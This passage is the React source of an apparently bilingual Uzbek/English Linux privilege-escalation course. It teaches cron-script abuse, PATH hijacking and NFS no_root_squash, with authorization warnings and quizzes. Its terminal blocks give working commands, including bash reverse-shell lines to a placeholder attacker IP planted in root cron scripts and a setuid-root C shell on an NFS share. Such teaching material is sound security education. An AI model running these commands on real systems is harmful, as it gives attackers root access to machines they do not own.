    React.createElement(SlideImg,{src:"privesc/suid_s16_b.png",cap:"cat backup.sh — skript oxiriga teskari qobiq qatori (bash -i >& /dev/tcp/.../6666) qo'shildi.",capEn:"cat backup.sh — a reverse-shell line (bash -i >& /dev/tcp/.../6666) appended to the script."}),
    React.createElement(SlideImg,{src:"privesc/suid_s18.png",cap:"backup.sh oxiriga teskari qobiq qatori qo'shildi — cron uni root sifatida ishga tushiradi.",capEn:"A reverse-shell line appended to backup.sh — cron runs it as root."}),
    React.createElement(SlideImg,{src:"privesc/suid_s17.png",cap:"nc -lvnp — hujum mashinasida kiruvchi teskari qobiq ulanishini kutamiz.",capEn:"nc -lvnp — on the attack box we wait for the incoming reverse-shell connection."}),
    React.createElement(SlideImg,{src:"privesc/suid_s20.png",cap:"nc -nlvp 7777 tinglovchisi ulanishni qabul qiladi va id uid=0(root) ni ko'rsatadi — root qobig'i keldi.",capEn:"The nc -nlvp 7777 listener accepts the connection and id shows uid=0(root) — a root shell arrived."}),
    React.createElement(H2,{num:"§4"},t(lang,"PATH-in-cron va wildcard","PATH-in-cron and wildcards")),
    React.createElement(P,null,t(lang,"Yana bir keng tarqalgan xato — o'chirilgan skriptning cron yozuvi qolib ketishi (change management muammosi). Agar skriptning to'liq yo'li ko'rsatilmagan bo'lsa (masalan antivirus.sh), cron /etc/crontab dagi PATH bo'yicha qidiradi, va biz o'sha nom bilan o'z skriptimizni yozib qo'yishimiz mumkin. Bundan tashqari, cron skriptida wildcard (*) ishlatilsa — masalan tar, 7z yoki rsync bilan — ularning joker belgilar xususiyatidan foydalanib buyruq inyeksiya qilish mumkin. Shu sababli cron ishiga bog'langan har qanday skript va vositani sinchiklab o'rganing.","Another common mistake is a leftover cron entry for a deleted script (a change-management problem). If the script's full path isn't specified (e.g. antivirus.sh), cron searches along the PATH in /etc/crontab, and we can drop our own script with that name. Also, if a cron script uses a wildcard (*) — for example with tar, 7z or rsync — you can inject commands via their wildcard handling. So carefully study any script and tool tied to a cron job.")),
    React.createElement(SlideImg,{src:"privesc/suid_s19.png",cap:"cat antivirus.sh — PATH-in-cron uchun yaratilgan teskari qobiq skripti (port 7777).",capEn:"cat antivirus.sh — a reverse-shell script created for the PATH-in-cron trick (port 7777)."}),
React.createElement(H2,{num:"§5"},t(lang,"Interaktiv simulyator: wildcard inyeksiyasi","Interactive simulator: wildcard injection")),
    React.createElement(P,null,t(lang,"§4 da tilga olingan wildcard texnikasini amalda ko'ring — xuddi shu tar cron buyrug'ini ikki yozilish shaklida sinang:","See the wildcard technique mentioned in §4 in action — try the exact same tar cron command written two ways:")),
    React.createElement(WildcardInjectionSim),
        React.createElement(Terminal,null,"# Cron ishlarini ko'rish\ncat /etc/crontab\n\n# Yoziladigan root skriptiga teskari qobiq qo'shish\necho 'bash -i >& /dev/tcp/<HUJUM-IP>/7777 0>&1' >> backup.sh\n\n# Hujum mashinasida tinglovchi\nnc -lvnp 7777\n\n# PATH-in-cron: skript nomi bilan o'z faylimizni yaratamiz\necho 'bash -i >& /dev/tcp/<HUJUM-IP>/7777 0>&1' > /home/user/antivirus.sh\nchmod +x /home/user/antivirus.sh\n\n# Capability tekshiruvi\ngetcap -r / 2>/dev/null"),
    eth("Cron va capability ekspluatatsiyasi tizimni o'zgartiradi — faqat o'z laboratoriyangizda yoki ruxsat berilgan pentestda sinang; teskari qobiqni afzal ko'ring, tizim yaxlitligini buzmang.","Cron and capability exploitation modify the system — only test in your own lab or an authorized pentest; prefer a reverse shell and don't break system integrity."),
    React.createElement(Quiz,{q:{uz:"Nega yoziladigan root cron skripti xavflidir?",en:"Why is a writable root cron script dangerous?"},opts:[{uz:"Chunki u internetni sekinlashtiradi",en:"Because it slows the internet"},{uz:"Chunki cron uni root imtiyozi bilan ishga tushiradi, biz esa unga o'z kodimizni qo'sha olamiz",en:"Because cron runs it with root privileges, and we can add our own code to it"},{uz:"Chunki u ko'p joy egallaydi",en:"Because it uses a lot of space"},{uz:"Chunki u parol talab qiladi",en:"Because it requires a password"}],correct:1,exp:{uz:"Cron skriptni egasi (root) imtiyozi bilan ishga tushiradi; agar biz skriptni tahrirlay olsak, qo'shgan kodimiz ham root bilan bajariladi.",en:"Cron runs the script with the owner's (root) privileges; if we can edit it, our added code also executes as root."}}));
}
function LessonL38(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"PATH nima?","What is PATH?")),
    React.createElement(P,null,t(lang,"PATH — operatsion tizimga bajariladigan fayllarni qayerdan qidirishni aytadigan muhit o'zgaruvchisi. To'liq yo'l bilan yozilmagan har qanday buyruq uchun Linux PATH ostidagi papkalarni navbatma-navbat qidiradi. Masalan, siz shunchaki \"thm\" desangiz, tizim PATH dagi /usr/local/sbin, /usr/bin, /bin va hokazolarda thm faylini qidiradi. (Diqqat: PATH — muhit o'zgaruvchisi; \"yo'l\" esa faylning joylashuvi.) Bu qidiruv tartibi privesc vektorini yaratishi mumkin.","PATH is an environment variable that tells the OS where to look for executables. For any command not written as a full path, Linux searches the folders under PATH in order. For example, if you just type \"thm\", the system looks for the thm file in /usr/local/sbin, /usr/bin, /bin and so on. (Note: PATH is the environment variable; the \"path\" is a file's location.) This search order can create a privesc vector.")),
    React.createElement(SlideImg,{src:"privesc/path_s02.png",cap:"echo $PATH — tizim bajariladigan fayllarni ketma-ket qidiradigan papkalar ro'yxati.",capEn:"echo $PATH — the ordered list of folders the system searches for executables."}),
    React.createElement(SlideImg,{src:"privesc/path_s03.png",cap:"PATH stsenariysi — 'thm' buyrug'i to'liq yo'lsiz chaqirilsa, PATH ostidagi papkalardan qidiriladi.",capEn:"The PATH scenario — if 'thm' is called without a full path, it is searched for under PATH."}),
    React.createElement(H2,{num:"§2"},t(lang,"PATH hijacking","PATH hijacking")),
    React.createElement(P,null,t(lang,"Faraz qilaylik, SUID biti o'rnatilgan (root imtiyozi bilan ishlaydigan) dastur ichki buyruqni to'liq yo'lsiz chaqiradi — masalan, \"thm\" degan dasturni. Dastur uni PATH bo'yicha qidiradi. Agar PATH da yoziladigan papka bo'lsa (yoki biz PATH ga /tmp qo'shsak), o'sha papkaga \"thm\" nomli o'z zararli faylimizni qo'yamiz. SUID dastur ishga tushganda bizning \"thm\" ni root bilan ishga tushiradi. Sinashdan oldin to'rt savolga javob bering:","Suppose a SUID program (running with root) calls an internal command without a full path — say a program named \"thm\". The program searches for it along PATH. If a writable folder is in PATH (or we add /tmp to PATH), we drop our own malicious file named \"thm\" there. When the SUID program runs, it executes our \"thm\" as root. Before trying, answer four questions:")),
    React.createElement(LayerStack,{layers:[
      {n:"1",name:t(lang,"PATH tarkibi","PATH contents"),color:"#4dabf7",desc:{uz:"$PATH ostida qaysi papkalar bor?",en:"Which folders are under $PATH?"}},
      {n:"2",name:t(lang,"Yozish huquqi","Write access"),color:"#f7b955",desc:{uz:"Ulardan birortasiga yoza olasizmi?",en:"Can you write to any of them?"}},
      {n:"3",name:t(lang,"PATH o'zgartirish","Change PATH"),color:"#a855f7",desc:{uz:"$PATH ni o'zgartira olasizmi (export)?",en:"Can you modify $PATH (export)?"}},
      {n:"4",name:t(lang,"Zaif dastur","Vulnerable program"),color:"#ff3a5e",desc:{uz:"To'liq yo'lsiz buyruq chaqiruvchi SUID dastur bormi?",en:"Is there a SUID program calling a command without a full path?"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"PATH ekspluatatsiyasi","PATH exploitation")),
    React.createElement(P,null,t(lang,"Avval yoziladigan papkalarni topamiz (find / -writable 2>/dev/null) va natijani cut/sort bilan tozalaymiz. /tmp odatda yoziladigan, lekin PATH da bo'lmasligi mumkin — shuning uchun uni export PATH=/tmp:$PATH bilan qo'shamiz. So'ng /bin/bash nusxasini zaif dastur qidirayotgan nom (thm) bilan /tmp ga joylaymiz va bajarish huquqini beramiz. Bu bosqichda u foydalanuvchi huquqi bilan ishlaydi; imtiyozni oshiradigan narsa — zaif skriptning root bilan ishlashi. Skript ishga tushganda bizning \"thm\" (bash) root bilan ochiladi.","First we find writable folders (find / -writable 2>/dev/null) and clean the output with cut/sort. /tmp is usually writable but may not be in PATH — so we add it with export PATH=/tmp:$PATH. Then we place a copy of /bin/bash under /tmp with the name the vulnerable program looks for (thm) and make it executable. At this stage it runs with our user rights; what enables escalation is that the vulnerable script runs as root. When the script runs, our \"thm\" (bash) opens as root.")),
    React.createElement(SlideImg,{src:"privesc/path_s04.png",cap:"Zaif 'path' skripti bajariladigan faylga kompilyatsiya qilinib, SUID biti o'rnatiladi.",capEn:"The vulnerable 'path' script is compiled into an executable and given the SUID bit."}),
    React.createElement(SlideImg,{src:"privesc/path_s05.png",cap:"./path ishga tushganda PATH ostidagi papkalardan 'thm' nomli faylni qidiradi.",capEn:"When ./path runs, it looks for a file named 'thm' in the folders under PATH."}),
    React.createElement(SlideImg,{src:"privesc/path_s06_a.png",cap:"find / -writable 2>/dev/null — yoziladigan papkalarni qidirish.",capEn:"find / -writable 2>/dev/null — searching for writable folders."}),
    React.createElement(SlideImg,{src:"privesc/path_s06_b.png",cap:"Yoziladigan papkalar ro'yxati (davomi).",capEn:"The list of writable folders (continued)."}),
    React.createElement(SlideImg,{src:"privesc/path_s07_a.png",cap:"find / -writable | cut -d '/' -f 2,3 | grep -v proc | sort -u — natijani tozalash.",capEn:"find / -writable | cut -d '/' -f 2,3 | grep -v proc | sort -u — cleaning up the output."}),
    React.createElement(SlideImg,{src:"privesc/path_s07_b.png",cap:"Tozalangan yoziladigan papkalar; /tmp odatda yoziladi, lekin PATH da bo'lmasligi mumkin.",capEn:"The cleaned writable folders; /tmp is usually writable but may not be in PATH."}),
    React.createElement(SlideImg,{src:"privesc/path_s08_a.png",cap:"cd /tmp; echo '/bin/bash' > thm; chmod 777 thm — PATH ga qo'shilgach, zararli 'thm' yaratiladi.",capEn:"cd /tmp; echo '/bin/bash' > thm; chmod 777 thm — after adding to PATH, the malicious 'thm' is created."}),
    React.createElement(SlideImg,{src:"privesc/path_s08_b.png",cap:"./path (root SUID skript) ishga tushganda bizning thm (bash) root bilan ochiladi: id → uid=0(root).",capEn:"When ./path (a root SUID script) runs, our thm (bash) opens as root: id → uid=0(root)."}),
React.createElement(H2,{num:"§4"},t(lang,"Interaktiv simulyator: qachon PATH hijacking ishlaydi?","Interactive simulator: when does PATH hijacking work?")),
    React.createElement(P,null,t(lang,"§2 dagi 4-savolni his qiling — xuddi shu PATH hiylasi ikki SUID dastur ustida qanday farq qilishini ko'ring:","Feel §2's fourth question for yourself — see how the exact same PATH trick fares against two SUID programs:")),
    React.createElement(PathHijackSim),
    React.createElement(H2,{num:"§5"},t(lang,"NFS va no_root_squash","NFS and no_root_squash")),
    React.createElement(P,null,t(lang,"Imtiyozlarni oshirish faqat ichki vektorlar bilan cheklanmaydi. NFS (Network File Share) konfiguratsiyasi /etc/exports faylida saqlanadi va odatda o'qilishi mumkin. Muhim element — no_root_squash opsiyasi. Odatda NFS masofaviy root'ni past imtiyozli nfsnobody ga o'zgartiradi; lekin no_root_squash yoqilgan yoziladigan ulashmada masofaviy root o'z huquqini saqlaydi. Bu holda biz SUID bit o'rnatilgan bajariladigan fayl yaratib, uni nishonda root bilan ishga tushira olamiz.","Privilege escalation isn't limited to internal vectors. NFS (Network File Share) configuration is stored in /etc/exports and is usually readable. The key element is the no_root_squash option. Normally NFS maps a remote root to the low-privilege nfsnobody; but on a writable share with no_root_squash enabled, a remote root keeps its rights. In that case we can create a SUID executable and run it as root on the target.")),
    React.createElement(SlideImg,{src:"privesc/path_s10.png",cap:"cat /etc/exports — /tmp va /backups ulashmalarida no_root_squash opsiyasi (privesc vektori).",capEn:"cat /etc/exports — the no_root_squash option on the /tmp and /backups shares (a privesc vector)."}),
    React.createElement(H2,{num:"§6"},t(lang,"NFS ekspluatatsiyasi","NFS exploitation")),
    React.createElement(P,null,t(lang,"Hujum mashinamizdan o'rnatilishi mumkin bo'lgan ulashmalarni ko'ramiz (showmount -e), so'ng no_root_squash li ulashmani o'rnatamiz (mount). Ulashmada root bilan ishlaydigan oddiy C dasturini (nfs.c — /bin/bash ni chaqiradi) yozib, kompilyatsiya qilamiz va SUID bitini o'rnatamiz. Nishonda ushbu SUID fayl (nfs) root imtiyozi bilan ishlaydi, ./nfs esa to'g'ridan-to'g'ri root qobig'ini beradi.","From our attack box we list mountable shares (showmount -e), then mount the no_root_squash share (mount). On the share we write a simple C program that runs as root (nfs.c — it calls /bin/bash), compile it and set the SUID bit. On the target this SUID file (nfs) runs with root privileges, and ./nfs gives a root shell directly.")),
    React.createElement(SlideImg,{src:"privesc/path_s11_a.png",cap:"showmount -e <IP> — nishondagi NFS ulashmalarini ko'rish (/backups, /mnt/sharedfolder, /tmp).",capEn:"showmount -e <IP> — list the target's NFS shares (/backups, /mnt/sharedfolder, /tmp)."}),
    React.createElement(SlideImg,{src:"privesc/path_s11_b.png",cap:"no_root_squash li ulashmani hujum mashinamizga mount qilamiz (mount -o rw ...).",capEn:"We mount the no_root_squash share onto our attack box (mount -o rw ...)."}),
    React.createElement(SlideImg,{src:"privesc/path_s12_a.png",cap:"Ulashmada nfs.c yoziladi (setuid(0); system('/bin/bash')) va gcc bilan kompilyatsiya qilinadi.",capEn:"On the share we write nfs.c (setuid(0); system('/bin/bash')) and compile it with gcc."}),
    React.createElement(SlideImg,{src:"privesc/path_s12_b.png",cap:"chmod +s nfs — bajariladigan faylga SUID biti o'rnatiladi; nishonda u root bilan ishlaydi.",capEn:"chmod +s nfs — the SUID bit is set on the executable; on the target it runs as root."}),
    React.createElement(SlideImg,{src:"privesc/path_s13.png",cap:"Nishondagi nfs — SUID (-rwsr-sr-x root root); ./nfs → id uid=0(root). NFS orqali root olindi.",capEn:"The nfs binary on the target — SUID (-rwsr-sr-x root root); ./nfs → id uid=0(root). Root obtained via NFS."}),
    React.createElement(Terminal,null,"# ── PATH hijacking ──\necho $PATH\nfind / -writable 2>/dev/null | cut -d '/' -f 2,3 | grep -v proc | sort -u\nexport PATH=/tmp:$PATH\ncp /bin/bash /tmp/thm && chmod +x /tmp/thm\n./zaif_suid_dastur      # 'thm' ni qidiradi → bizning bash root bilan ishlaydi\n\n# ── NFS no_root_squash ──\ncat /etc/exports\nshowmount -e <NISHON-IP>          # ulashmalarni ko'rish\nmount -o rw <NISHON-IP>:/backups /mnt/nfs\n# /mnt/nfs da nfs.c yozamiz: int main(){setgid(0);setuid(0);system(\"/bin/bash\");}\ngcc nfs.c -o nfs && chmod +s nfs\n# nishonda: ./nfs  → uid=0(root)"),
    eth("PATH va NFS ekspluatatsiyasini faqat o'z laboratoriyangizda yoki yozma ruxsat berilgan pentestda sinang.","Only test PATH and NFS exploitation in your own lab or a written-authorized pentest."),
    React.createElement(Quiz,{q:{uz:"NFS'da qaysi opsiya privesc vektorini yaratadi?",en:"Which NFS option creates a privesc vector?"},opts:[{uz:"read_only",en:"read_only"},{uz:"no_root_squash",en:"no_root_squash"},{uz:"sync",en:"sync"},{uz:"noexec",en:"noexec"}],correct:1,exp:{uz:"no_root_squash masofaviy root'ni past imtiyozli foydalanuvchiga o'zgartirmaydi, shuning uchun yoziladigan ulashmada SUID bajariladigan fayl yaratib, uni root bilan ishga tushirish mumkin.",en:"no_root_squash doesn't map a remote root to a low-privilege user, so on a writable share you can create a SUID executable and run it as root."}}));
}
const root=ReactDOM.createRoot(document.getElementById("app"));
root.render(React.createElement(App));

/* ── Animated background particles (matches Windows module) ── */
(function(){
  function initBgParticles(){
    var el=document.getElementById("bg-root");
    if(!el) return;
    el.className="bg-stage bg-grid bg-scan";
    [].slice.call(el.querySelectorAll(".particle")).forEach(function(p){p.remove();});
    var count=30;
    for(var i=0;i<count;i++){
      var p=document.createElement("div");
      var isStar=i%5===0;
      p.className="particle"+(isStar?" particle-star":"");
      var s=isStar?3+Math.random()*3:1+Math.random()*2;
      p.style.width=p.style.height=s+"px";
      p.style.left=(Math.random()*100)+"%";
      p.style.top=(Math.random()*100)+"%";
      var angle=Math.random()*Math.PI*2;
      var dist=120+Math.random()*220;
      p.style.setProperty("--dx",(Math.cos(angle)*dist)+"px");
      p.style.setProperty("--dy",(Math.sin(angle)*dist-80)+"px");
      p.style.animationDuration=(isStar?20:12+Math.random()*20)+"s";
      p.style.animationDelay=(-Math.random()*35)+"s";
      el.appendChild(p);
    }
  }
  if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",initBgParticles);}
  else{initBgParticles();}
})();
